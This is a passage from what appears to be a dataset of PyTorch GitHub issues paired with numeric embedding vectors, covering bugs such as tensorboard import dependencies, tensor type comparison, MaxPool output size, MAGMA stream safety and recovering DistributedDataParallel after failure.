 -0.02408063  0.01875143  0.12725401 -0.02288077 -0.08838143  0.09884806
 -0.26573545 -0.09743986  0.03202956  0.18968762 -0.298145    0.11994906
  0.3350466   0.17979237 -0.16424651 -0.00877217 -0.07877856  0.17005128]"
"Dependency issues with torch.utils.tensorboard: ""No module named past"" and ""No module named 'PIL'"" module: dependency bug triaged","```
Python 3.7.3 (default, Mar 27 2019, 22:11:17)
[GCC 7.3.0] :: Anaconda, Inc. on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> torch.__version__
'1.2.0.dev20190607'
```

```
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import torch.utils.tensorboard
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/__init__.py"", line 6, in <module>
    from .writer import FileWriter, SummaryWriter  # noqa F401
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/writer.py"", line 17, in <module>
    from ._convert_np import make_np
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/_convert_np.py"", line 12, in <module>
    from caffe2.python import workspace
  File ""/miniconda/lib/python3.7/site-packages/caffe2/python/workspace.py"", line 15, in <module>
    from past.builtins import basestring
ModuleNotFoundError: No module named 'past'
```

`pip install future` fixes this problem, but it should rather be added to the requirements.txt or mentioned explicitly in the docs.

However then another issue happens:
```
Traceback (most recent call last):
  File ""train.py"", line 6, in <module>
    import torch.utils.tensorboard
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/__init__.py"", line 6, in <module>
    from .writer import FileWriter, SummaryWriter  # noqa F401
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/writer.py"", line 18, in <module>
    from ._embedding import make_mat, make_sprite, make_tsv, append_pbtxt
  File ""/miniconda/lib/python3.7/site-packages/torch/utils/tensorboard/_embedding.py"", line 6, in <module>
    from PIL import Image
ModuleNotFoundError: No module named 'PIL'
```

Docs mention dependency on `pillow`, but only for `add_image` and `add_images`. I think it should not break during import.",True,"[-3.96101713e-01 -4.52895820e-01 -3.83273184e-01  1.87524408e-02
  6.60176873e-02 -1.62926942e-01  5.27635626e-02  1.77098751e-01
 -4.91794914e-01 -9.09755379e-03 -1.77373439e-01  7.41039366e-02
 -3.70667696e-01  8.53639096e-02  1.06246755e-01  1.20748594e-01
  4.80962824e-03 -4.86404449e-01  1.06835194e-01 -1.57741830e-03
  2.17809200e-01 -5.77151217e-02 -2.76600480e-01  1.34928033e-01
  4.73110937e-04  6.04898483e-02 -2.52929240e-01 -1.47156909e-01
  1.17853969e-01  1.46087930e-01  6.75937682e-02  3.09024274e-01
 -2.36595094e-01  2.43281111e-01  2.74986058e-01 -6.84554279e-02
 -2.45572299e-01 -2.78312385e-01 -6.89668655e-02 -2.43469939e-01
  7.43277743e-02  1.54655054e-03 -2.90641814e-01  4.77035642e-02
 -1.72206953e-01 -5.03960848e-02  1.97944582e-01 -3.61245722e-02
 -2.23228619e-01 -2.90813208e-01 -1.78590715e-02  2.92919949e-02
 -5.74397743e-02 -4.16116476e-01  1.04012579e-01 -2.85507739e-01
  5.48272394e-02  2.54502147e-01  3.03995371e-01 -2.03647435e-01
  9.10262465e-02  5.62579185e-02  1.84888113e-02  1.32339224e-01
 -6.53280169e-02  1.33067556e-02  1.08786419e-01 -6.23119920e-02
  6.23594761e-01 -6.24009334e-02 -1.62260741e-01 -2.73469277e-02
 -1.81591466e-01 -8.28480348e-04 -3.24135721e-02 -1.03162061e-02
 -2.33868897e-01  1.59880012e-01 -1.04029424e-01 -3.21335435e-01
 -8.47181678e-02  1.84534937e-01  1.03506997e-01  1.96762353e-01
  1.80526823e-01  8.15235674e-02  4.02714312e-02 -2.05035135e-02
  1.79168284e-01  1.00922436e-01  2.03597367e-01  1.18423261e-01
  5.21227837e-01  4.89952922e-01 -4.03382689e-01 -1.16130840e-02
  3.33855242e-01 -8.04889947e-02 -3.35070968e-01 -2.65489101e-01
  7.91365355e-02 -2.15207830e-01 -1.27827942e-01  3.31240177e-01
  1.30330920e-01 -6.82765171e-02  3.53940934e-01  1.88908614e-02
 -2.69609466e-02 -2.73541510e-01  3.24307233e-01  9.94051471e-02
  9.44490880e-02 -3.64990473e-01 -9.42464359e-03  2.09649503e-02
 -6.27101779e-01 -1.77312829e-03 -1.94661077e-02  5.76236844e-01
 -1.41165107e-01  7.57653266e-02  1.52994603e-01  3.32309723e-01
  4.05029178e-01  1.44501060e-01  2.78497394e-03  2.69423258e-02
  9.93695334e-02  9.17645395e-02 -2.11319700e-02  1.79508135e-01
 -2.26588458e-01  1.95296392e-01  5.52306354e-01  4.94853616e-01
 -4.70309168e-01 -3.77667010e-01  2.46262878e-01  4.37234342e-03
 -2.00969294e-01  2.96129853e-01  1.50617465e-01 -1.31623864e-01
  7.54109863e-03 -9.86212492e-02  7.90041387e-02  7.77430758e-02
 -1.34730488e-01  1.18226558e-01  1.39315039e-01 -1.85909960e-02
 -2.59191841e-01  3.82332623e-01 -4.82358634e-02  2.94958055e-01
  2.94384092e-01  4.01211902e-02  2.05932051e-01 -4.11480606e-01
  1.70800865e-01  3.31685901e-01 -1.30369097e-01  6.09075651e-02
 -1.51348803e-02 -2.23968569e-02 -4.45251465e-01 -3.55602324e-01
 -1.79224402e-01  1.42429098e-01  3.01025771e-02 -6.19464740e-02
  1.43880546e-01 -5.42954803e-02  7.75267631e-02 -8.57802033e-02
  3.80821347e-01 -4.75517154e-01 -8.93271714e-02  5.88946819e-01
  1.69927046e-01  3.33977461e-01  7.55159482e-02  6.72642738e-02
 -2.04258449e-02  1.39654249e-01  2.51505077e-01 -3.64699304e-01
  5.27611747e-02  1.96139365e-02 -2.75939494e-01  8.53981376e-02
  1.56500131e-01 -5.49870096e-02 -1.86035305e-01  1.15112871e-01
  2.86956847e-01 -1.92900866e-01 -1.98350444e-01 -3.80927980e-01
 -3.43178749e-01  6.25236988e-01  6.68112189e-02  2.06209481e-01
  5.27571477e-02 -2.23346025e-01 -2.08146185e-01 -1.44815803e-01
 -2.41393179e-01 -2.04455942e-01  1.14287712e-01 -3.03665623e-02
 -2.92492628e-01 -4.77815539e-01  2.21199214e-01  2.32363924e-01
  2.88259268e-01 -7.47369602e-03 -5.43025210e-02 -3.37589979e-02
  2.61668622e-01 -5.42822406e-02  1.63731679e-01 -2.63357460e-01
  1.56437859e-01 -1.07201084e-01 -2.69758105e-01 -1.26291856e-01
 -5.33679239e-02  9.10125077e-02 -3.55994284e-01 -3.70359927e-01
  1.84705764e-01  1.09610990e-01  1.78016350e-03  7.96799287e-02
  2.44147763e-01 -5.42287827e-02 -4.94483523e-02  3.00166786e-01
 -4.21491951e-01 -1.63628086e-01  7.43663535e-02 -1.26153976e-01
 -2.85730839e-01  1.83140993e-01 -1.84786320e-01 -1.98862702e-02
 -2.86193818e-01  3.68176959e-02  3.79615277e-03 -6.98650479e-02
 -1.82783604e-02  3.40282246e-02  2.32181013e-01  3.57086957e-03
 -1.08117394e-01 -1.50178403e-01  1.82563215e-01 -3.79210949e-01
 -5.85374162e-02  1.77256912e-01 -1.10850401e-01  1.59688443e-01
  7.20720887e-02  1.40848875e-01 -4.31307480e-02  1.44869655e-01
 -1.06156208e-01 -5.95740229e-02  1.37326479e-01 -2.00873703e-01
  4.18648839e-01  1.79595679e-01  9.00949538e-02 -2.07080543e-01
  4.53076452e-01 -5.61139584e-02  1.24544993e-01 -2.21404493e-01
  2.51462847e-01  3.35088193e-01 -1.64827362e-01  1.19172469e-01
  4.92239356e-01 -1.38668597e-01 -1.09912500e-01 -2.75342166e-01
 -2.79619366e-01 -2.25845963e-01 -2.90975645e-02  9.77370888e-02
  4.12508607e-01 -1.86521530e-01  1.67682953e-03 -2.40375042e-01
  1.16804659e-01 -2.57184386e-01  1.74268652e-02  1.65117145e-01
 -7.04878867e-02 -4.26143222e-03  1.69208795e-01 -1.88268602e-01
  1.05423167e-01 -2.85742879e-01 -4.30936441e-02  2.51323283e-01
  2.32661858e-01 -3.18991423e-01  3.77880603e-01  6.75287023e-02
 -9.70171466e-02  1.88543171e-01  4.12069559e-02 -4.55786921e-02
 -2.93017507e-01  4.05613959e-01  2.80920684e-01 -2.29568332e-02
  1.42780945e-01 -6.69565946e-02 -3.43489617e-01  1.51064962e-01
 -6.24137409e-02 -7.65610412e-02 -3.81486058e-01  4.38892804e-02
 -1.57613486e-01  1.61302090e-01  6.71901554e-02  5.30568473e-02
  2.76869953e-01  1.49022013e-01 -2.39212036e-01 -1.65961117e-01
 -8.99620801e-02  3.50584120e-01 -5.28655499e-02 -1.69572115e-01
  1.13126129e-01 -1.31784976e-01  1.08477578e-01 -3.30223322e-01
 -3.50558460e-01 -3.91064808e-02  4.48209465e-01  1.22562014e-01
 -1.78424716e-01  6.74050748e-02 -2.92198509e-02 -1.97313726e-02
 -1.86032221e-01  1.33544594e-01  2.50138223e-01  3.00993174e-01
  1.19785689e-01  2.88830325e-03  1.02578551e-01  1.94044918e-01
 -1.93162456e-01  1.15736470e-01 -2.88617909e-01 -2.17142791e-01
  2.05925465e-01 -1.65006727e-01  1.76755823e-02  8.93560946e-02
 -6.44821525e-02  2.33699679e-01 -1.92525133e-01  1.61215678e-01
 -1.16189390e-01  3.66044641e-02  3.63357067e-01 -4.78692353e-03
 -1.52929187e-01  1.98900402e-01  3.21852118e-02 -3.08574438e-01
  3.05830181e-01  1.05916634e-02  5.30533791e-02 -1.16333038e-01]"
Ambiguous torch.Tensor int vs float comparison triaged module: type promotion,"## ðŸ› Bug

Ambiguous torch.Tensor int vs float comparison

## To Reproduce
input: torch.Tensor([0]).int() < 0.5
output: tensor([0], dtype=torch.uint8)

## Expected behavior
Expected numpy-like behavior:
input: torch.Tensor([0]).int() < 0.5
output: tensor([1])

- PyTorch 1.0.1
- Ubuntu 18.04",True,"[-0.44961795 -0.35345155 -0.18586996 -0.01028733 -0.04507249 -0.35281083
  0.0726618  -0.03270096 -0.32410958 -0.39325207 -0.0826366   0.18280135
 -0.3726377   0.1849283   0.06036773 -0.15501854 -0.10709187 -0.29230854
 -0.09367778 -0.04088644  0.08506749 -0.2186204  -0.21286304  0.13278574
 -0.09212683  0.15290351  0.02307537  0.03989598  0.19720946  0.0620233
  0.26096755  0.1094681  -0.48943642 -0.06147844 -0.24040042  0.04141941
 -0.19354345  0.1362475  -0.22579665  0.04207351  0.23567267  0.07212404
  0.13268708  0.02774237 -0.019153    0.16326405  0.03247216  0.05318278
 -0.16214637  0.00195654  0.20319983 -0.05668812 -0.02901838 -0.10679189
 -0.06011387 -0.11951011 -0.13721946 -0.27960414  0.04770785 -0.22093084
 -0.01130303 -0.11174357 -0.08080558  0.07492162 -0.01165985 -0.08847226
  0.2448519  -0.02019503  0.4187215   0.08750609  0.42579865 -0.02282786
 -0.11792249 -0.03961002 -0.06547708 -0.10730866 -0.05501973  0.309901
  0.02619675 -0.28000337 -0.07444437 -0.05687666  0.11429042 -0.18194936
 -0.03753866 -0.1898969   0.36000577  0.06593051  0.2884843  -0.1981095
  0.41659558  0.27945045 -0.19807974 -0.0148537   0.10167827  0.12977049
  0.22622944 -0.14971946  0.03595615 -0.14437513 -0.32271525 -0.41333747
 -0.24195775  0.15858375  0.3331116  -0.12589745 -0.156298    0.13518456
  0.3570959  -0.03300096  0.30376297  0.05770559  0.22546494  0.07706534
 -0.10962941 -0.2999712  -0.21202655  0.05372362  0.27742636  0.40799588
 -0.02524195  0.05193675  0.22911462  0.3699744   0.11556023 -0.02092922
 -0.30092752 -0.00604075 -0.19166961  0.25758773  0.15151379 -0.16799498
 -0.33163723  0.09173693  0.24000706  0.35821408 -0.37565583 -0.09680387
 -0.22300379  0.08834399 -0.27117673  0.22591507 -0.247352   -0.13061793
  0.1720359  -0.05136903 -0.3787205  -0.16988146  0.10083482  0.27810025
  0.00937044  0.01960511  0.08512167  0.1373498   0.04060181 -0.07992329
  0.08344779 -0.19921732  0.45280865 -0.4158721   0.23745777  0.3809524
 -0.02788209 -0.11381882  0.25103852  0.10304648 -0.27908224 -0.24320686
 -0.3234961   0.35256183  0.02596299 -0.31852493 -0.237736    0.31365886
  0.21952842 -0.33325723  0.05876238 -0.8395007  -0.19527553  0.32037193
  0.17385027  0.59263015  0.43065542  0.10029472 -0.08017609  0.14921877
  0.3911283   0.0845163  -0.03918606 -0.15290225 -0.22595231 -0.5142156
 -0.28030396  0.00801858  0.26183322  0.17512612  0.1143223  -0.19698784
 -0.03170856 -0.06048866 -0.40371653 -0.15444537 -0.1043696  -0.23196337
  0.14926107 -0.19554746 -0.16271304 -0.3045756  -0.5161585   0.29769644
 -0.12461662 -0.10035864 -0.0979856  -0.14589877 -0.21192889 -0.13910654
 -0.11515054  0.2256779  -0.09374535  0.6320024   0.22674257 -0.06728394
  0.1069727  -0.20482379 -0.22503184 -0.09919086 -0.52140695  0.19323014
 -0.20749168  0.14513406  0.06190991 -0.28130993  0.34569708  0.12568463
 -0.23217747  0.05793266 -0.16146748 -0.1266297  -0.12200987  0.01432768
 -0.00559593  0.19389297  0.28611234 -0.2520887  -0.07099728  0.48595804
 -0.1838707  -0.17702332 -0.24559669  0.1492287   0.04969319  0.00301886
  0.03682041 -0.24925435  0.33543253 -0.08004271  0.12730484  0.14001638
  0.21004371 -0.05094963  0.23204023  0.21960756  0.03208874  0.40584892
  0.27303848  0.11613765  0.05075392  0.41919285 -0.11364588 -0.04497448
 -0.23344931 -0.14378142  0.42321607 -0.22799113  0.09142271 -0.4162823
  0.14372274 -0.01949915 -0.26717904 -0.4444464   0.4360729   0.27566767
 -0.30828518  0.46375814  0.20949997 -0.4119148   0.04327805 -0.28667447
 -0.20467143  0.04841535 -0.25856113  0.04787692  0.34981564 -0.20992304
 -0.21986169  0.07160881  0.24418035 -0.09227812 -0.05497021  0.35152492
  0.07610136  0.07012879  0.61131793 -0.39514354 -0.30196851 -0.01424846
  0.2643102   0.25766107  0.13300209 -0.14544421  0.21869905 -0.18330017
 -0.03575659  0.13141112  0.21888039  0.27323034 -0.19475031  0.363649
  0.2652689  -0.05415012  0.06302872 -0.16030757 -0.2183233  -0.07013809
 -0.2021982   0.07519913  0.1647854  -0.1483095  -0.24240272 -0.17273042
 -0.18773358 -0.21328819  0.26421615  0.19851129 -0.12045879 -0.31755874
 -0.0888662   0.25884417 -0.03087078 -0.18070075 -0.25404254  0.26316252
  0.02233089 -0.14633042 -0.44603956 -0.0030105   0.48744136  0.04950628
 -0.17035852  0.05809261 -0.04637604  0.3300498  -0.26882723  0.20092309
  0.41109577  0.38352954  0.11483657 -0.05142022  0.25139523  0.25187278
  0.09495396  0.05836549 -0.17054029 -0.08666476  0.46825615 -0.11727189
  0.28866073 -0.14396814  0.1466915   0.27649918  0.01862144  0.26018587
  0.20952904  0.3255155   0.5560577  -0.73665816 -0.36311933  0.07853222
  0.27520648  0.0559416   0.3051351  -0.21733421  0.21738812 -0.07582079]"
Unexpected output size for Maxpool module: nn triaged,"The output of Maxpool has an unexpected size for some corner cases.

Repro:
Maxpool1d(kernel_size=3, stride=2, padding=0, dilation=2)
input=torch.randn(1,1,4)

If I use the L_out formula from the documentation (https://pytorch.org/docs/stable/nn.html?highlight=maxpool#torch.nn.MaxPool1d) to compute the output size, I get {1,1,0}.
However, the output generated has a size of {1, 1, 1}.

And with ONNX, the same operation results in an output of shape {1,1,0}
(https://github.com/microsoft/onnxruntime/issues/1224).

Since this case is not mentioned in the documentation, I was wondering if this is a special case that is handled separately by design (to avoid returning an output with a dim of 0), or if it is a bug.
",True,"[-2.00810134e-01  1.10591620e-01 -3.74327898e-01 -1.68682575e-01
 -1.96649116e-02 -2.42308885e-01 -1.94611866e-02  4.49779898e-01
 -3.30405772e-01 -7.63493776e-02 -2.91760445e-01  9.55722928e-02
  1.63338274e-01  9.14143678e-03 -1.91103637e-01  1.97681725e-01
 -2.39893377e-01 -4.80577201e-02 -3.46383780e-01 -4.09131467e-01
  9.92336124e-02 -3.71932276e-02  3.18741985e-02 -9.26967338e-03
  2.42318973e-01 -5.51590845e-02 -1.79343909e-01 -1.26430631e-01
  6.93149716e-02 -2.83806145e-01 -6.83301836e-02  1.51685253e-01
 -2.04286814e-01  6.24872465e-03  1.75748408e-01 -1.81961313e-01
 -2.75031805e-01 -1.33695841e-01 -1.87664419e-01  1.84077740e-01
 -1.62529442e-02  1.20668501e-01  1.19651541e-01 -1.90018788e-02
  7.44069275e-03 -2.76985597e-02 -2.92085290e-01  3.62350941e-01
 -2.44470425e-02 -8.09785575e-02  1.79554492e-01  4.43032056e-01
 -1.38561651e-02  2.26293784e-02  6.63475394e-02 -2.42256597e-01
 -3.34250540e-01 -1.38016209e-01 -1.93538144e-02 -5.00266910e-01
  1.19606502e-01  1.63203329e-01  2.12448224e-01  5.42584434e-03
 -3.37061360e-02 -2.19130784e-01  2.21486166e-01 -3.62992063e-02
  4.90137190e-02  1.73572376e-01 -1.08250178e-01 -1.47837754e-02
 -3.97639811e-01 -4.13805470e-02  1.96248323e-01  3.03235650e-01
 -1.83414295e-01  1.30032063e-01 -2.21448839e-01 -1.52745128e-01
 -3.45302403e-01  4.14956585e-02  2.23593652e-01 -2.44185209e-01
 -1.56671435e-01  2.83190720e-02  5.90074241e-01 -8.54414254e-02
  3.13764334e-01  1.63406253e-01  1.48095742e-01 -1.67780481e-02
 -5.40885329e-01  1.89236760e-01 -1.13237455e-01 -6.12455569e-02
  1.54877365e-01 -3.07359070e-01 -2.48983189e-01  1.52872391e-02
 -4.03616168e-02 -3.73358727e-01 -7.19099268e-02  2.30137438e-01
  2.59885341e-01  3.58027130e-01  1.26597241e-01  2.67752051e-01
  2.44744077e-01  1.05633914e-01  5.13219535e-01 -9.16355941e-03
  6.62538633e-02  3.33722472e-01  1.46274507e-01  1.86935216e-01
 -1.74977794e-01 -1.29556833e-02 -8.57388750e-02  4.98117477e-01
  4.16227877e-02  2.71806955e-01 -1.08048692e-02  1.99334413e-01
  1.39152825e-01  2.41584182e-01  3.96755457e-01 -5.12440465e-02
 -1.26068890e-01 -1.42774776e-01  1.31916061e-01  4.50207479e-02
  5.65837622e-02  3.05789292e-01  1.54295996e-01  3.12948406e-01
  1.70099400e-02 -4.07059267e-02 -4.20480937e-01  1.36089697e-01
 -1.86829448e-01 -2.86393166e-01 -3.61740351e-01 -3.25079143e-01
  1.29227817e-01  2.67965466e-01 -7.60363638e-01  5.65921888e-04
 -1.27555698e-01  3.79048772e-02 -3.73601913e-03 -7.33094737e-02
 -3.53510827e-01 -1.67496111e-02  7.65378624e-02  1.03748634e-01
  2.71152049e-01  1.92435496e-02  1.44037187e-01 -2.34788626e-01
  3.51025820e-01  3.05703640e-01  1.36204869e-01  8.55368003e-02
  1.74028665e-01  8.38853121e-02 -3.02513912e-02  1.85447186e-01
 -5.19955277e-01  3.25957417e-01  1.65123433e-01 -2.08954979e-02
 -4.18446898e-01  1.16390489e-01  5.18258274e-01 -3.32924396e-01
 -5.57572663e-01 -8.88615549e-02  1.41359959e-03  2.51781493e-01
  2.39957452e-01  5.11986017e-01  2.70044565e-01 -1.50255635e-01
 -2.59797245e-01  3.18846963e-02  5.08739948e-01  2.10487992e-01
 -3.24654758e-01  1.70709625e-01  5.83874471e-02 -2.86895633e-01
  8.38440731e-02  9.01756585e-02  8.40511248e-02 -6.18990213e-02
  9.01238769e-02 -8.14550668e-02  2.05659777e-01  3.25099798e-03
  2.25613832e-01 -1.13875248e-01  1.96865544e-01  1.94824010e-01
  2.56323516e-01 -4.64853942e-02 -3.52813601e-01 -2.86009550e-01
 -2.24342853e-01  2.10736126e-01 -9.92448181e-02 -4.34510022e-01
 -2.41093382e-01 -5.24678946e-01 -2.94003427e-01  1.01031624e-01
  6.05599917e-02 -2.06513479e-01 -1.15194783e-01  1.67192787e-01
  1.29476875e-01 -2.99759030e-01 -5.47222123e-02 -2.38724768e-01
  1.97121710e-01 -1.12148628e-01 -2.56018460e-01 -9.27276239e-02
  6.84061944e-02  1.51570514e-01  4.99172211e-02  1.43576860e-01
  1.23185046e-01 -1.94635004e-01 -5.34163415e-02  4.38481063e-01
 -3.23536605e-01 -1.82779133e-01  3.11240368e-02  3.48144546e-02
  1.23532727e-01 -8.55206996e-02  1.67539760e-01  8.25955123e-02
  3.10689881e-02 -1.13509431e-01 -2.58097291e-01  1.53866962e-01
 -4.47074287e-02  5.65615110e-02 -1.77058876e-01 -5.22878505e-02
 -2.51897633e-01 -1.59101918e-01  4.14260447e-01 -2.15565600e-03
  1.22558869e-01  3.21858346e-01  7.99224749e-02 -3.35458070e-01
  2.37861693e-01  3.48635018e-01 -2.46915929e-02  3.53126109e-01
  5.77679388e-02 -4.12587881e-01 -2.49107391e-01  3.21760058e-01
  4.92263138e-02 -3.06886315e-01  9.04537551e-03 -4.77880001e-01
  3.31349313e-01  3.66884172e-02 -4.28083315e-02 -3.21899116e-01
  2.30086058e-01  3.93087640e-02 -1.55026376e-01 -1.31635994e-01
  7.84741901e-03  4.12974626e-01  8.24155286e-02  2.31967077e-01
  7.96707161e-03 -2.94851154e-01 -4.63798568e-02 -1.66172504e-01
 -1.48854256e-02 -1.72022581e-01 -5.09598255e-02 -1.37836993e-01
  2.94556413e-02  9.17343646e-02 -1.56287342e-01  3.91432822e-01
  2.20838860e-01  1.90726757e-01 -1.46802500e-01 -5.54877743e-02
  1.98187917e-01  4.70818877e-02  2.55388975e-01 -4.16032895e-02
 -3.38178188e-01  1.01036668e-01  1.14979610e-01  1.57504916e-01
  3.73200744e-01 -9.71338078e-02  4.51203525e-01  3.15525308e-02
 -2.86529541e-01  2.14086950e-01  1.90150402e-02  1.83655590e-01
 -8.62378329e-02  2.69120395e-01  1.55498907e-01  7.52916932e-02
 -9.12944973e-02 -2.56184578e-01 -4.95432764e-01  2.95285583e-01
  9.49293934e-03  1.48185134e-01 -7.69580081e-02  5.82736656e-02
 -7.98186436e-02  3.11879888e-02  4.73211080e-01 -2.67056853e-01
 -8.73242170e-02 -2.08869174e-01  1.89975828e-01 -1.27493903e-01
 -3.13316405e-01  2.53725231e-01 -1.83579743e-01 -1.79034621e-01
 -8.07137266e-02 -2.38177925e-02  5.09786755e-02 -5.59077621e-01
 -1.14413515e-01 -4.63661075e-01  2.40946844e-01  2.20353901e-01
 -4.43291888e-02 -5.30772448e-01  9.12483856e-02  1.34610027e-01
 -9.89097059e-02  1.39702410e-01  3.13361406e-01  4.19498146e-01
 -1.62031338e-01  2.58460879e-01 -1.41063541e-01  4.16325569e-01
 -1.74059406e-01  1.65547580e-01 -1.08385637e-01 -2.56765425e-01
  7.41458982e-02 -1.33168250e-01  1.27939105e-01  1.11839920e-01
 -3.96523364e-02 -1.09240413e-02  1.77611873e-01  1.95721388e-01
 -6.36083931e-02  4.36207324e-01  2.05078378e-01 -2.83298492e-01
 -1.61850318e-01 -1.14587113e-01 -1.28898591e-01 -8.05993974e-02
 -2.17682451e-01  1.66680276e-01 -1.74416173e-02 -6.56718761e-02]"
Stream safety of MAGMA functions high priority module: internals triaged,"#21785 showed that `at::svd()` is not stream-safe.  `at::svd()` uses `magma_dgesdd()`.

According to  http://icl.cs.utk.edu/magma/forum/viewtopic.php?f=2&t=1080, the old way of making MAGMA functions stream-safe is:

```
lock()
magmablasSetKernelStream( s1 )
magma_dgemm( ... )
unlock() 
```

The new way is using a `magma_queue_t`, but not all functions have it.  In particular `magma_dgesdd()` doesn't appear to have this parameter.


I'm not sure if either of these methods can be integrated into `pytorch`.  Meanwhile, the functions should probably raise an error if a non-default stream is detected.
",True,"[-0.37710032 -0.21049173  0.15363555 -0.09707201  0.10301857 -0.25972155
 -0.08515774  0.02931253 -0.28652206  0.23837197 -0.02376783 -0.01668344
 -0.21101962  0.00560075 -0.00701037  0.08968898  0.03068688  0.04141403
 -0.07144959  0.16148318 -0.02985076 -0.22998227 -0.0880814  -0.00107937
  0.0538662   0.08866853  0.08493602  0.02139533  0.12312003  0.13049595
 -0.18149203 -0.30669272 -0.16296601 -0.18657374  0.06305776  0.1364834
 -0.08904357 -0.35770977 -0.53660333  0.01489008  0.03774914 -0.07485243
 -0.0494149   0.17042299 -0.2452503   0.07886845  0.0196491  -0.18043667
 -0.3290009   0.03651764 -0.14702368  0.00748106 -0.10001998 -0.15695739
 -0.31950042 -0.12751077  0.46885604  0.08918241 -0.01948689  0.12719496
  0.01443934 -0.13763255  0.15610923  0.07925572  0.19377594 -0.09533185
 -0.03770768  0.11552682  0.32498124  0.08086491  0.41302133  0.0882035
 -0.3239107  -0.40783715 -0.05801117  0.3443019  -0.22295576  0.15053435
 -0.09899254 -0.2515074   0.27529052  0.10687597  0.0401443  -0.11797839
  0.17479697  0.2393986  -0.16957386  0.18632625  0.29367667  0.04341509
  0.24396124  0.16957542  0.01480691  0.2959048   0.30442256  0.2779925
  0.17881262  0.23918709 -0.28686824 -0.3737696   0.1544958   0.19165017
 -0.37535822  0.24617624  0.23687238  0.4616655   0.22843742  0.28605872
 -0.07663572  0.08262017  0.2850281  -0.41428885  0.04483456  0.13655312
  0.15450454  0.00857157  0.01806296  0.17672709 -0.5655203   0.10472829
  0.01594863 -0.34718657  0.22613916  0.13571948  0.44417113 -0.16371731
 -0.04792094  0.17571351  0.17784591 -0.11067145 -0.08499628  0.06482964
 -0.03751829  0.1291887   0.34883147 -0.01032056 -0.4062019   0.01053039
 -0.29856557  0.11049477 -0.25093716  0.12509055 -0.4903596  -0.2707973
  0.28162652 -0.04353696 -0.11124919  0.1204785   0.24171421 -0.21471062
 -0.00241518 -0.13414356 -0.13171826  0.1638639  -0.07245937  0.02372466
 -0.14199081 -0.0596808   0.26625064 -0.37895414  0.05930618  0.12912172
  0.19906366  0.2129094   0.24640365  0.04240576 -0.5782733   0.09337693
 -0.12088053 -0.5037722  -0.10645038 -0.05083189  0.18181261  0.00817596
  0.13604279 -0.1080735  -0.07118196 -0.41270834 -0.13916525  0.3324933
  0.12691668  0.25060555  0.00189905  0.03226404 -0.06651686  0.1395241
  0.08257477  0.00417864 -0.11408968 -0.04206959 -0.10705325  0.09420502
 -0.2830274  -0.10292248  0.00355476 -0.05418365  0.0856818   0.07543087
 -0.03128487  0.03989495 -0.12557226  0.3648783  -0.10146422 -0.11355744
  0.11274335  0.1372737  -0.05901929 -0.27741596 -0.620702   -0.02743205
 -0.23233369  0.06536778 -0.04748287 -0.06190989  0.06143799  0.28586227
 -0.10432671  0.01924746  0.13469708 -0.15680017  0.28910872 -0.06436396
  0.0339674  -0.25381258  0.04616766  0.12292874  0.13477191  0.03918323
 -0.18451306  0.23885198 -0.21507826 -0.16465367  0.23732613 -0.08809882
  0.1499595   0.32047442  0.22901098 -0.27353007  0.1493825   0.00855057
 -0.18801327 -0.33299774 -0.01920971  0.02536796  0.01112799  0.01729828
 -0.36157387  0.1049137  -0.08847186  0.28211033 -0.31068063 -0.40198648
 -0.10043295  0.11569862  0.02485149  0.45855433 -0.09449523 -0.33253437
 -0.01290797  0.20196295  0.20468983  0.24103734 -0.37016344  0.45646328
 -0.0272235   0.22166222 -0.20260459  0.14567327 -0.600756    0.02357048
  0.45261812 -0.22347037  0.07837749  0.31065285  0.16836062 -0.1748853
  0.62056375 -0.06246993  0.21726337  0.04000225  0.07661587  0.31472528
 -0.4863587  -0.03937855  0.39260447  0.05796475 -0.12531874 -0.35809508
 -0.12429725 -0.17064638 -0.18605511  0.03290387  0.06752096  0.0237847
  0.03424535 -0.12402681  0.20805052  0.2676525   0.40443748 -0.42219174
 -0.23903558  0.20320341  0.24154755 -0.14341918  0.0809114   0.00324064
  0.05340115  0.03938356  0.5704306  -0.6087523   0.37854308 -0.11859589
 -0.03579527  0.01011398 -0.01294701  0.23747236 -0.16734847  0.16457696
 -0.00571691  0.07018989  0.10798658 -0.20555127 -0.2004176  -0.09937669
  0.20035335 -0.19856307 -0.23689607  0.18660703 -0.35056278  0.130998
  0.10146235  0.00439065  0.1551576  -0.5462768  -0.04925559  0.07256614
  0.25156534  0.26467398 -0.02722308 -0.20923662 -0.05973215  0.00093902
  0.04423791 -0.45892972 -0.11390752  0.08640847  0.47142094  0.10314303
 -0.19442499  0.1491222   0.08354948 -0.07197195 -0.0591871   0.22030431
 -0.04462109  0.39896208  0.06793977 -0.05777013 -0.10569604  0.15940893
 -0.3248754   0.02921235 -0.10812154 -0.24023193 -0.18827583  0.18745947
 -0.13813269  0.09919187  0.05617543  0.46276432 -0.33914948  0.03521779
 -0.23561572  0.05411216  0.3882262  -0.13820145  0.12152214 -0.02165946
  0.0096144   0.02339782 -0.0384521   0.22146663  0.04662354 -0.15564036]"
Make DDP failure recoverable oncall: distributed module: autograd triaged,"@kuttas @pietern and I had a discussion on how to make DDP failure recoverable. The process involves the following steps:

```python
m = SomeModel()
dist.init_process_group()
ddp = DistributedDataParallel(m)
# got error
dist.destroy_process_group()
dist.init_process_group()
del ddp
ddp = DistributedDataParallel(m)
```

This does not work in today's DDP. Currently, to get better performance, DDP assigns the [original module](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/nn/parallel/distributed.py#L316) to the first module replica instead of creating a new one. Then, it creates a new `Reducer` to [add post hooks](https://github.com/pytorch/pytorch/blob/fa4ca4e70e98fbe944d1435929ea4fd17c7bed7d/torch/csrc/distributed/c10d/reducer.cpp#L108-L112) to sync params. However, because every reconstructed DDP instance wraps the same original module, all their reducers will add hooks to the same set of variables. Hence, after 10 recoveries, each param (variable) in the original module will have 11 hooks introduced by 11 different reducers, where only the last one is still alive. We thought about several potential solutions:

#### Solution 1: Force Module Replication

Force DDP to create new module replicas instead of using the original module. In this way, those variables in the replicas will die together with the DDP instance. But it will make the DDP slower. Maybe make it an option?

#### Solution 2: Delete Hooks in Destructor

